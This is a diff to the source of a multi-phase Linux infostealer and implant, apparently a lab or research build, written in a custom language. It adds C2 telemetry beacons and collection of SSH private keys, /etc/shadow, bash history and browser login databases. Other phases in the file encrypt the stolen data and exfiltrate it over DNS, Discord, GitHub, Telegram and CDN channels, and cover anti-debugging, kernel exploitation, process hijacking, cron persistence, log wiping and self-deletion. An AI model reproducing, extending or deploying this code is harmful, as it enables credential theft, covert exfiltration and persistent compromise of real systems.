@@ -4,7 +4,8 @@
 
 const C2_PRIMARY = "http://192.168.56.1:8443/api/config"
 const C2_FALLBACK = "http://192.168.56.1:8443/api/config"
-const CDN_ENDPOINT = "http://192.168.56.1:9000/upload"
+const CDN_ENDPOINT = "http://192.168.56.1:8443/upload"
+const TELEMETRY_URL = "http://192.168.56.1:8443/api/telemetry/simple"
 const MODEL_REPO = "http://192.168.56.1:9000/models"
 const MODEL_FILE = "phi-3-mini-4k-instruct.gguf"
 const LOCAL_MODEL_PATH = "/tmp/.jocky_model"
@@ -44,6 +45,21 @@ var persistence_set = false
 var is_root_user = false
 var c2_connected = false
 
+// ===== TELEMETRY =====
+fn report_phase(phase: i32, event_type: string, status: string) {
+    let url = TELEMETRY_URL + "?chain=research_chain_v4_linux&phase=" + string(phase) + "&type=" + event_type + "&status=" + status
+    let buf = malloc(64)
+    jocky_http_get(url, buf, 64)
+    free(buf)
+}
+
+fn report_detail(phase: i32, event_type: string, status: string, detail: string) {
+    let url = TELEMETRY_URL + "?chain=research_chain_v4_linux&phase=" + string(phase) + "&type=" + event_type + "&status=" + status + "&detail=" + detail
+    let buf = malloc(64)
+    jocky_http_get(url, buf, 64)
+    free(buf)
+}
+
 // ===== PRIVILEGE CHECK =====
 fn phase_check_privilege() {
     is_root_user = jocky_is_root()
@@ -58,6 +74,7 @@ fn phase_check_privilege() {
 // ===== PHASE 0: ANTI-ANALYSIS =====
 fn phase_anti_analysis() -> bool {
     println("[*] Phase 0: Anti-Analysis Detection")
+    report_phase(0, "phase_start", "active")
 
     if jocky_is_debugger_present() {
         println("    [!] Debugger detected - aborting")
@@ -82,6 +99,7 @@ fn phase_anti_analysis() -> bool {
 // ===== PHASE 0.5: AI ADAPTIVE MUTATION =====
 fn phase_ai_mutation() -> bool {
     println("[*] Phase 0.5: AI Adaptive Code Mutation")
+    report_phase(0, "phase_start", "active")
 
     let init_ok = ai_init()
     if init_ok != 0 {
@@ -113,25 +131,32 @@ fn phase_ai_mutation() -> bool {
 // ===== PHASE 1: C2 BOOTSTRAP =====
 fn phase_c2_bootstrap() -> bool {
     println("[*] Phase 1: C2 Bootstrap & Configuration")
+    report_phase(1, "phase_start", "active")
 
-    let config = jocky_http_get(C2_PRIMARY, "", 4096)
-    if config != 0 {
+    let buf = malloc(4096)
+    let config = jocky_http_get(C2_PRIMARY, buf, 4096)
+    if config > 0 {
         println("    [+] PRIMARY C2 responded")
+        report_phase(1, "phase_complete", "success")
         c2_connected = true
         cdn_token = "Bearer_linux_production_v4"
         model_path = LOCAL_MODEL_PATH
+        free(buf)
         return true
     }
 
     println("    [-] C2 unreachable — offline mode (model download skipped)")
+    report_detail(1, "phase_complete", "failure", "c2_unreachable")
     cdn_token = "Bearer_linux_production_v4"
     println("")
+    free(buf)
     return true
 }
 
 // ===== PHASE 2: MODEL DOWNLOAD =====
 fn phase_download_model() -> bool {
     println("[*] Phase 2: Model Download & Caching")
+    report_phase(2, "phase_start", "active")
 
     if !c2_connected {
         println("    [~] No C2 — AI runs in heuristic-only mode")
@@ -161,6 +186,7 @@ fn phase_download_model() -> bool {
 // ===== PHASE 3: DATA DISCOVERY =====
 fn phase_discover_data() -> bool {
     println("[*] Phase 3: Data Discovery & Inventory")
+    report_phase(3, "phase_start", "active")
 
     var found_targets = 0
     for path in DATA_PATHS {
@@ -178,45 +204,85 @@ fn phase_discover_data() -> bool {
 // ===== PHASE 4: COMPREHENSIVE DATA COLLECTION =====
 fn phase_collect_data() -> bool {
     println("[*] Phase 4: Data Collection")
+    report_phase(4, "phase_start", "active")
 
-    // /home — always accessible for the running user's profile
-    let home_files = fs_list_files("/home", true)
-    if strlen(home_files) > 0 {
-        collected_data = jocky_str_concat(collected_data, home_files)
-        println("    [+] /home: " + string(strlen(home_files)) + " bytes")
+    // HIGH-VALUE: Read actual file contents first (appear at top of exfil data)
+    let home_contents = fs_read_text_files_in_dir("/home")
+    if strlen(home_contents) > 0 {
+        collected_data = jocky_str_concat(collected_data, home_contents)
+        println("    [+] /home file contents: " + string(strlen(home_contents)) + " bytes")
+        report_detail(4, "data_item", "success", "home_files")
     }
 
-    // Browser credentials (user-accessible — no root needed)
-    let chrome_path = "/home/.config/google-chrome/Default/Login Data"
-    let firefox_path = "/home/.mozilla/firefox"
-    let chromium_path = "/home/.config/chromium/Default/Login Data"
+    // SSH keys
+    let ssh_key = fs_read_file("/root/.ssh/id_rsa")
+    if strlen(ssh_key) > 0 {
+        collected_data = jocky_str_concat(collected_data, ssh_key)
+        println("    [+] SSH private key: " + string(strlen(ssh_key)) + " bytes")
+        report_detail(4, "data_item", "success", "ssh_key")
+    }
+    let ssh_pub = fs_read_file("/root/.ssh/id_rsa.pub")
+    if strlen(ssh_pub) > 0 {
+        collected_data = jocky_str_concat(collected_data, ssh_pub)
+    }
+    let known_hosts = fs_read_file("/root/.ssh/known_hosts")
+    if strlen(known_hosts) > 0 {
+        collected_data = jocky_str_concat(collected_data, known_hosts)
+        println("    [+] SSH known_hosts: " + string(strlen(known_hosts)) + " bytes")
+        report_detail(4, "data_item", "success", "ssh_known_hosts")
+    }
 
-    let chrome_data = fs_read_file(chrome_path)
+    // Bash history
+    let bash_hist = fs_read_file("/root/.bash_history")
+    if strlen(bash_hist) > 0 {
+        collected_data = jocky_str_concat(collected_data, bash_hist)
+        println("    [+] Bash history: " + string(strlen(bash_hist)) + " bytes")
+        report_detail(4, "data_item", "success", "bash_history")
+    }
+
+    // /etc/shadow and /etc/passwd (root only)
+    let shadow = fs_read_file("/etc/shadow")
+    if strlen(shadow) > 0 {
+        collected_data = jocky_str_concat(collected_data, shadow)
+        println("    [+] /etc/shadow: " + string(strlen(shadow)) + " bytes")
+        report_detail(4, "data_item", "success", "etc_shadow")
+    }
+    let passwd = fs_read_file("/etc/passwd")
+    if strlen(passwd) > 0 {
+        collected_data = jocky_str_concat(collected_data, passwd)
+        println("    [+] /etc/passwd: " + string(strlen(passwd)) + " bytes")
+        report_detail(4, "data_item", "success", "etc_passwd")
+    }
+
+    // hosts file
+    let hosts = fs_read_file("/etc/hosts")
+    if strlen(hosts) > 0 {
+        collected_data = jocky_str_concat(collected_data, hosts)
+        println("    [+] Hosts file: " + string(strlen(hosts)) + " bytes")
+        report_detail(4, "data_item", "success", "hosts_file")
+    }
+
+    // Browser credentials (user-accessible)
+    let chrome_data = fs_read_file("/home/.config/google-chrome/Default/Login Data")
     if strlen(chrome_data) > 0 {
         collected_data = jocky_str_concat(collected_data, chrome_data)
         println("    [+] Chrome login data: " + string(strlen(chrome_data)) + " bytes")
+        report_detail(4, "data_item", "success", "chrome_db")
     }
-
-    let chromium_data = fs_read_file(chromium_path)
+    let chromium_data = fs_read_file("/home/.config/chromium/Default/Login Data")
     if strlen(chromium_data) > 0 {
         collected_data = jocky_str_concat(collected_data, chromium_data)
         println("    [+] Chromium login data: " + string(strlen(chromium_data)) + " bytes")
+        report_detail(4, "data_item", "success", "chromium_db")
     }
 
-    let firefox_data = fs_list_files(firefox_path, true)
-    if strlen(firefox_data) > 0 {
-        collected_data = jocky_str_concat(collected_data, firefox_data)
-        println("    [+] Firefox profiles: " + string(strlen(firefox_data)) + " bytes")
+    // BULK: Directory listings last
+    let home_list = fs_list_files("/home", true)
+    if strlen(home_list) > 0 {
+        collected_data = jocky_str_concat(collected_data, home_list)
+        println("    [+] /home listing: " + string(strlen(home_list)) + " bytes")
     }
 
-    // /opt — readable by all on most systems
-    let opt_files = fs_list_files("/opt", true)
-    if strlen(opt_files) > 0 {
-        collected_data = jocky_str_concat(collected_data, opt_files)
-        println("    [+] /opt: " + string(strlen(opt_files)) + " bytes")
-    }
-
-    // Root-only paths
     if is_root_user {
         let root_files = fs_list_files("/root", true)
         if strlen(root_files) > 0 {
@@ -253,6 +319,7 @@ fn phase_collect_data() -> bool {
 // ===== PHASE 5: ENCRYPTION & ENCODING =====
 fn phase_encrypt_data() -> bool {
     println("[*] Phase 5: Data Encryption & Encoding")
+    report_phase(5, "phase_start", "active")
 
     if strlen(collected_data) > 0 {
         let raw_len = strlen(collected_data)
@@ -260,19 +327,21 @@ fn phase_encrypt_data() -> bool {
         // XOR and RC4 with captured length — avoids strlen on binary data after encryption
         jocky_decrypt_xor(collected_data, raw_len, 0x42, 1)
         println("    [+] XOR encryption applied")
+        report_detail(5, "technique", "success", "xor")
 
         jocky_decrypt_rc4(collected_data, raw_len, "key123", 6)
         println("    [+] RC4 encryption applied")
+        report_detail(5, "technique", "success", "rc4")
 
-        // Compress with captured length (pre-encryption length is correct)
         let compressed = jocky_compress_data(collected_data, raw_len)
         let comp_size = jocky_compress_get_size()
         println("    [+] Data compressed: " + string(comp_size) + " bytes")
+        report_detail(5, "technique", "success", "compress")
 
-        // Base64 with actual compressed size — not strlen (compressed is binary)
         let encoded = jocky_data_base64_encode(compressed, comp_size)
         collected_data = encoded
         println("    [+] Base64 encoded: " + string(strlen(collected_data)) + " bytes")
+        report_detail(5, "technique", "success", "base64")
     }
 
     println("")
@@ -282,6 +351,7 @@ fn phase_encrypt_data() -> bool {
 // ===== PHASE 6: MULTI-CHANNEL EXFILTRATION =====
 fn phase_exfiltrate() -> bool {
     println("[*] Phase 6: Exfiltration (5 Channels)")
+    report_phase(6, "phase_start", "active")
 
     if strlen(collected_data) == 0 {
         println("    [!] No data to exfiltrate")
@@ -291,26 +361,31 @@ fn phase_exfiltrate() -> bool {
     // CDN
     if jocky_exfil_front(CDN_ENDPOINT, cdn_token, collected_data, "POST", 4096) {
         println("    [+] CDN exfiltration successful")
+        report_detail(6, "exfil_sent", "success", "cdn")
     }
 
     // DNS
     if jocky_exfil_dns(CDN_ENDPOINT, collected_data, 256) {
         println("    [+] DNS tunnel exfiltration successful")
+        report_detail(6, "exfil_sent", "success", "dns")
     }
 
     // Discord
-    if jocky_exfil_discord(CDN_ENDPOINT, collected_data, 2000) {
+    if jocky_exfil_discord(CDN_ENDPOINT, collected_data, 1500) {
         println("    [+] Discord exfiltration successful")
+        report_detail(6, "exfil_sent", "success", "discord")
     }
 
     // GitHub
     if jocky_exfil_github(cdn_token, CDN_ENDPOINT, collected_data, 1024) {
         println("    [+] GitHub exfiltration successful")
+        report_detail(6, "exfil_sent", "success", "github")
     }
 
     // Telegram
     if jocky_exfil_telegram(cdn_token, CDN_ENDPOINT, collected_data, 512) {
         println("    [+] Telegram exfiltration successful")
+        report_detail(6, "exfil_sent", "success", "telegram")
     }
 
     println("[+] Multi-channel exfiltration complete")
@@ -321,6 +396,7 @@ fn phase_exfiltrate() -> bool {
 // ===== PHASE 7: KERNEL EXPLOITATION (15 TECHNIQUES) =====
 fn phase_kernel_exploit() -> bool {
     println("[*] Phase 7: Kernel Exploitation (15 Techniques)")
+    report_phase(7, "phase_start", "active")
 
     if !is_root_user {
         println("    [~] Kernel exploit skipped (requires root — attempting LPE via FENCE2PWN)")
@@ -417,6 +493,7 @@ fn phase_kernel_exploit() -> bool {
 // ===== PHASE 8: PROCESS HIJACKING & CONTROL =====
 fn phase_process_hijacking() -> bool {
     println("[*] Phase 8: Process Hijacking & Thread Control")
+    report_phase(8, "phase_start", "active")
 
     if !is_root_user {
         println("    [~] Cross-process ptrace skipped (requires CAP_SYS_PTRACE or root)")
@@ -461,6 +538,7 @@ fn phase_process_hijacking() -> bool {
 // ===== PHASE 9: MODULE OPERATIONS & SYMBOL RESOLUTION =====
 fn phase_module_operations() -> bool {
     println("[*] Phase 9: Dynamic Module Operations")
+    report_phase(9, "phase_start", "active")
 
     let module = jocky_module_load("/lib64/libc.so.6")
     if module != null {
@@ -497,6 +575,7 @@ fn phase_module_operations() -> bool {
 // ===== PHASE 10: FORENSIC ANALYSIS & COLLECTION =====
 fn phase_forensic_analysis() -> bool {
     println("[*] Phase 10: Forensic Evidence Collection & Analysis")
+    report_phase(10, "phase_start", "active")
 
     // Collect journal entries BEFORE cleanup
     let journal_entries = forensic_collect_journal_entries()
@@ -542,6 +621,7 @@ fn phase_forensic_analysis() -> bool {
 // ===== PHASE 11: PERSISTENCE & ANTI-FORENSICS =====
 fn phase_persistence_and_cleanup() -> bool {
     println("[*] Phase 11: Persistence & Anti-Forensics")
+    report_phase(11, "phase_start", "active")
 
     // Cron — user crontab works without root
     if jocky_cron_install("/usr/local/bin/jocky_service", "*/5 * * * *") {
@@ -609,6 +689,7 @@ fn phase_persistence_and_cleanup() -> bool {
 // ===== PHASE 12: SELF-DELETION =====
 fn phase_self_delete() -> bool {
     println("[*] Phase 12: Self-Deletion Protocol")
+    report_phase(12, "phase_start", "active")
 
     // Remove from Cron
     jocky_cron_remove("jocky_service")
@@ -688,6 +769,7 @@ fn main() -> i32 {
 
     println("")
     println("[+] Execution complete")
+    report_phase(12, "phase_complete", "success")
     println("[*] Exfiltrated: " + string(strlen(collected_data)) + " bytes")
     println("[*] Root Achieved: " + string(root_achieved))
     println("[*] Kernel Access: " + string(kernel_access))
